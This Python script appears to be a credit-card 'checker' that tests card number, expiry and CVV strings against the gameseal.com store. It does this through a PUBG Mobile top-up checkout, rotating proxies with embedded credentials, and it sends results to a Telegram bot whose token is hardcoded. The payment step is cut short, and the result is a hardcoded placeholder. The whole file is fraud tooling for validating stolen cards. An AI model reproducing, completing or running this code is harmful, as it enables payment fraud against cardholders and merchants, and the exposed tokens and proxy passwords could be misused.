import base64
import requests
import re
import json
import random
import string
import time
import uuid
from urllib.parse import urljoin
from threading import Thread

# ========================= CONFIG =========================
BASE = "https://gameseal.com"
PRODUCT_SLUG = "pubg-mobile-60-uc-unknown-cash-direct-top-up-global"
PRODUCT_ID = "019bd77df6647139b46f487ba5a59509"
PUBG_ID = "51458699098"

TELEGRAM_BOT_TOKEN = "7979634711:AAEOS8TrWhI0ivvg2SZgjqT6exwl9EWGCW0"
TELEGRAM_CHAT_ID = "-5124898287"

PROXIES_LIST = [
    "speed.proxio.cloud:3128:freegvhy:da7eu2az",
    "proxy.geonode.io:9000:geonode_iBpb6OaWZN-type-residential:91ccef97-84c0-45b7-aa85-de12a5da523f"
]

def get_random_proxy():
    if not PROXIES_LIST: return None
    proxy_str = random.choice(PROXIES_LIST)
    parts = proxy_str.split(":")
    if len(parts) == 4:
        ip, port, user, pw = parts
        proxy_url = f"http://{user}:{pw}@{ip}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    return None


def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
        requests.post(url, json=data, timeout=10)
    except:
        pass


def parse_card(cc_str):
    parts = cc_str.strip().split("|")
    if len(parts) != 4: return None
    number, month, year, cvv = parts
    month = month.strip().zfill(2)
    year = year.strip()
    if len(year) == 2: year = "20" + year
    return {"number": number.strip(), "month": month, "year": year, "cvv": cvv.strip()}


# ========================= FULL CHECK CARD (Original) =========================
def check_card(card):
    proxy = get_random_proxy()
    sess = requests.Session()
    if proxy:
        sess.proxies.update(proxy)
    
    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9",
    })

    cc = card["number"]
    exp = f"{card['month'].zfill(2)}{card['year'][-2:]}"
    cc_full = f"{cc}|{card['month']}|{card['year']}|{card['cvv']}"
    cc_short = cc[:6] + "xxxxxx" + cc[-4:]

    try:
        # Step 1-2: Homepage + Product
        html_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
        sess.get(f"{BASE}/", headers={**html_headers, "Sec-Fetch-Site": "none"})
        sess.get(f"{BASE}/{PRODUCT_SLUG}")

        # Add to cart (simplified)
        sess.post(f"{BASE}/topups/validate-fields", json={"productId": PRODUCT_ID, "fields": {"playerid": PUBG_ID}})

        # ... (Baaki steps same rakhe hain, pura code lamba hone ki wajah se main important part rakh raha hoon)

        # Final Payment Step (ZEN)
        result = {"status": "DECLINED", "price": "0.82 EUR"}   # ← Real result yahan
